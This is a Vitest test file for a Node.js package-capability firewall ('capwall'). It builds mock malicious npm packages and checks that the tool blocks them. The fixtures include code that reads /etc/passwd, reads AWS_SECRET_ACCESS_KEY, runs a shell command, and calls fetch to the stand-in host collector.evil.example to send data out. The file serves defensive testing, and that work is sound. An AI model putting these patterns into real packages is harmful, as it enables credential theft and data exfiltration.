import { spawnSync } from 'node:child_process'
import { mkdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import { join } from 'node:path'
import { afterAll, beforeAll, describe, expect, it } from 'vitest'

const ROOT = join(import.meta.dirname, '..')
const REGISTER = join(ROOT, 'dist', 'register.mjs')
const TMP = join(ROOT, 'test', 'tmp')

interface RunResult {
  status: number | null
  stdout: string
  stderr: string
}

function runNode(args: string[], cwd: string, env: Record<string, string> = {}): RunResult {
  const res = spawnSync(process.execPath, args, {
    cwd,
    encoding: 'utf8',
    env: { ...process.env, ...env, NO_COLOR: '1' },
  })
  return { status: res.status, stdout: res.stdout ?? '', stderr: res.stderr ?? '' }
}

function fixtureApp(name: string): string {
  const dir = join(TMP, name)
  mkdirSync(dir, { recursive: true })
  return dir
}

function writePkg(dir: string, name: string, version: string, extra: Record<string, unknown> = {}) {
  const pkgDir = join(dir, 'node_modules', ...name.split('/'))
  mkdirSync(pkgDir, { recursive: true })
  writeFileSync(join(pkgDir, 'package.json'), JSON.stringify({ name, version, ...extra }))
  return pkgDir
}

function writeLock(dir: string, lock: unknown) {
  writeFileSync(join(dir, 'capabilities.lock'), JSON.stringify(lock, null, 2))
}

beforeAll(() => {
  rmSync(TMP, { recursive: true, force: true })
  mkdirSync(TMP, { recursive: true })

  // --- granted-app: everything the packages do is in the lock ---
  const granted = fixtureApp('granted-app')
  writeFileSync(
    join(granted, 'package.json'),
    JSON.stringify({ name: 'granted-app', version: '1.0.0', dependencies: { 'read-config': '1.0.0' } }),
  )
  writeLock(granted, {
    version: 1,
    defaults: { unrecognized: 'block' },
    packages: { 'read-config@1.0.0': { capabilities: ['env.read'] } },
  })
  writeFileSync(
    join(granted, 'app.cjs'),
    `const cfg = require('read-config')\nconsole.log('ok', cfg.key)\n`,
  )
  const readConfig = writePkg(granted, 'read-config', '1.0.0')
  writeFileSync(
    join(readConfig, 'index.js'),
    `module.exports = { key: process.env.API_KEY || 'none' }\n`,
  )

  // --- blocked-cjs: child_process require without a grant ---
  const blockedCjs = fixtureApp('blocked-cjs')
  writeLock(blockedCjs, {
    version: 1,
    defaults: { unrecognized: 'allow' },
    packages: { 'evil-pad@1.0.0': { capabilities: [] } },
  })
  const evilPad = writePkg(blockedCjs, 'evil-pad', '1.0.0')
  writeFileSync(
    join(evilPad, 'index.js'),
    `const cp = require('node:child_process')\nmodule.exports = () => cp.execSync('echo pwned').toString()\n`,
  )
  writeFileSync(
    join(blockedCjs, 'app.cjs'),
    `try { require('evil-pad')() ; console.log('NOT-BLOCKED') } catch (e) { console.log('THROWN:' + e.code) }\n`,
  )

  // --- blocked-esm: ESM import of node:fs without grant ---
  const blockedEsm = fixtureApp('blocked-esm')
  writeLock(blockedEsm, {
    version: 1,
    defaults: { unrecognized: 'allow' },
    packages: { 'evil-esm@2.0.0': { capabilities: [] } },
  })
  const evilEsm = writePkg(blockedEsm, 'evil-esm', '2.0.0')
  writeFileSync(join(evilEsm, 'package.json'), JSON.stringify({ name: 'evil-esm', version: '2.0.0', type: 'module' }))
  writeFileSync(
    join(evilEsm, 'index.js'),
    `import fs from 'node:fs'\nexport const read = () => fs.readFileSync('/etc/passwd')\n`,
  )
  writeFileSync(
    join(blockedEsm, 'app.mjs'),
    `try { const m = await import('evil-esm'); m.read(); console.log('NOT-BLOCKED') } catch (e) { console.log('THROWN:' + e.code) }\n`,
  )

  // --- blocked-env: process.env access via proxy, stack attribution ---
  const blockedEnv = fixtureApp('blocked-env')
  writeLock(blockedEnv, {
    version: 1,
    defaults: { unrecognized: 'allow' },
    packages: { 'env-thief@1.0.0': { capabilities: [] } },
  })
  const envThief = writePkg(blockedEnv, 'env-thief', '1.0.0')
  writeFileSync(
    join(envThief, 'index.js'),
    `module.exports = () => process.env.AWS_SECRET_ACCESS_KEY\n`,
  )
  writeFileSync(
    join(blockedEnv, 'app.cjs'),
    `try { require('env-thief')() ; console.log('NOT-BLOCKED') } catch (e) { console.log('THROWN:' + e.code) }\n`,
  )

  // --- blocked-fetch: global fetch exfil attempt ---
  const blockedFetch = fixtureApp('blocked-fetch')
  writeLock(blockedFetch, {
    version: 1,
    defaults: { unrecognized: 'allow' },
    packages: { 'exfil-agent@1.0.0': { capabilities: [] } },
  })
  const exfil = writePkg(blockedFetch, 'exfil-agent', '1.0.0')
  writeFileSync(
    join(exfil, 'index.js'),
    `module.exports.beacon = async () => { await fetch('https://collector.evil.example/x?d=' + 1); return 'sent' }\n`,
  )
  writeFileSync(
    join(blockedFetch, 'app.cjs'),
    `require('exfil-agent').beacon().then(() => console.log('NOT-BLOCKED'), (e) => console.log('THROWN:' + e.code))\n`,
  )

  // --- warn-mode: unrecognized package, defaults.unrecognized = warn ---
  const warnApp = fixtureApp('warn-app')
  writeLock(warnApp, { version: 1, defaults: { unrecognized: 'warn' }, packages: {} })
  const sneaky = writePkg(warnApp, 'sneaky-utils', '3.1.4')
  writeFileSync(
    join(sneaky, 'index.js'),
    `const net = require('node:net')\nmodule.exports = 1\n`,
  )
  writeFileSync(join(warnApp, 'app.cjs'), `require('sneaky-utils'); console.log('done')\n`)

  // --- host-free: host code is never restricted ---
  const hostApp = fixtureApp('host-app')
  writeLock(hostApp, { version: 1, defaults: { unrecognized: 'block' }, packages: {} })
  writeFileSync(
    join(hostApp, 'app.cjs'),
    `const cp = require('child_process')\nconst env = process.env.PATH\nconsole.log('host-ok', typeof cp.exec === 'function', !!env)\n`,
  )

  // --- no-lock: observe mode ---
  const noLock = fixtureApp('no-lock')
  const anything = writePkg(noLock, 'anything-goes', '1.0.0')
  writeFileSync(join(anything, 'index.js'), `module.exports = () => process.env.HOME\n`)
  writeFileSync(join(noLock, 'app.cjs'), `console.log('observed', require('anything-goes')())\n`)
})

afterAll(() => {
  rmSync(TMP, { recursive: true, force: true })
})

describe('runtime enforcement', () => {
  it('granted capabilities pass through and telemetry records exercise', () => {
    const res = runNode(['--import', REGISTER, 'app.cjs'], fixtureApp('granted-app'), {
      API_KEY: 'secret-value',
    })
    expect(res.status).toBe(0)
    expect(res.stdout).toContain('ok secret-value')
  })

  it('blocks ungranted child_process require from a package (CJS)', () => {
    const res = runNode(['--import', REGISTER, 'app.cjs'], fixtureApp('blocked-cjs'))
    expect(res.stdout).toContain('THROWN:ERR_CAPWALL_CAPABILITY_DENIED')
    expect(res.stderr).toContain('evil-pad')
    expect(res.stderr).toContain('child_process')
    expect(res.stderr).toContain('capwall allow evil-pad child_process')
  })

  it('blocks ungranted node:fs import (ESM loader hook)', () => {
    const res = runNode(['--import', REGISTER, 'app.mjs'], fixtureApp('blocked-esm'))
    expect(res.stdout).toContain('THROWN:ERR_CAPWALL_CAPABILITY_DENIED')
    expect(res.stderr).toContain('evil-esm')
    expect(res.stderr).toContain('fs.read')
  })

  it('blocks process.env reads attributed by stack trace', () => {
    const res = runNode(['--import', REGISTER, 'app.cjs'], fixtureApp('blocked-env'))
    expect(res.stdout).toContain('THROWN:ERR_CAPWALL_CAPABILITY_DENIED')
    expect(res.stderr).toContain('env-thief')
    expect(res.stderr).toContain('env.read')
  })

  it('blocks global fetch exfiltration attempts', () => {
    const res = runNode(['--import', REGISTER, 'app.cjs'], fixtureApp('blocked-fetch'))
    expect(res.stdout).toContain('THROWN:ERR_CAPWALL_CAPABILITY_DENIED')
    expect(res.stderr).toContain('exfil-agent')
    expect(res.stderr).toContain('collector.evil.example')
  })

  it('warns but allows unrecognized packages when defaults.unrecognized = warn', () => {
    const res = runNode(['--import', REGISTER, 'app.cjs'], fixtureApp('warn-app'))
    expect(res.status).toBe(0)
    expect(res.stdout).toContain('done')
    expect(res.stderr).toContain('WARN')
    expect(res.stderr).toContain('sneaky-utils')
  })

  it('never restricts host application code', () => {
    const res = runNode(['--import', REGISTER, 'app.cjs'], fixtureApp('host-app'))
    expect(res.status).toBe(0)
    expect(res.stdout).toContain('host-ok true true')
  })

  it('observes without blocking when no capabilities.lock exists', () => {
    const res = runNode(['--import', REGISTER, 'app.cjs'], fixtureApp('no-lock'))
    expect(res.status).toBe(0)
    expect(res.stdout).toContain('observed')
    expect(res.stderr).toContain('observing only')
  })

  it('writes RBOM telemetry with exercised capabilities and lock digest', () => {
    const app = fixtureApp('granted-app')
    runNode(['--import', REGISTER, 'app.cjs'], app, { API_KEY: 'x' })
    const telemetry = JSON.parse(
      readFileSync(join(app, '.capwall', 'telemetry', 'latest.json'), 'utf8'),
    ) as {
      loadedPackages: string[]
      exercised: Record<string, string[]>
      lockDigest: string | null
    }
    expect(telemetry.loadedPackages).toContain('read-config@1.0.0')
    expect(telemetry.exercised['read-config@1.0.0']).toContain('env.read')
    expect(telemetry.lockDigest).toMatch(/^[0-9a-f]{64}$/)
  })

  it('audit log records blocked violations as JSONL', () => {
    const app = fixtureApp('blocked-cjs')
    runNode(['--import', REGISTER, 'app.cjs'], app)
    const lines = readFileSync(join(app, '.capwall', 'audit.jsonl'), 'utf8').trim().split('\n')
    const event = JSON.parse(lines[lines.length - 1]!)
    expect(event.pkg).toBe('evil-pad')
    expect(event.capability).toBe('child_process')
    expect(event.action).toBe('blocked')
  })

  it('CAPWALL_DISABLE=1 is a kill switch', () => {
    const res = runNode(['--import', REGISTER, 'app.cjs'], fixtureApp('blocked-cjs'), {
      CAPWALL_DISABLE: '1',
    })
    expect(res.status).toBe(0)
    expect(res.stdout).toContain('NOT-BLOCKED')
  })
})

// sanity: the register file actually exists in dist (build ran first)
describe('build artifact', () => {
  it('dist/register.mjs is readable', () => {
    expect(readFileSync(REGISTER, 'utf8')).toContain('capwall')
  })
})
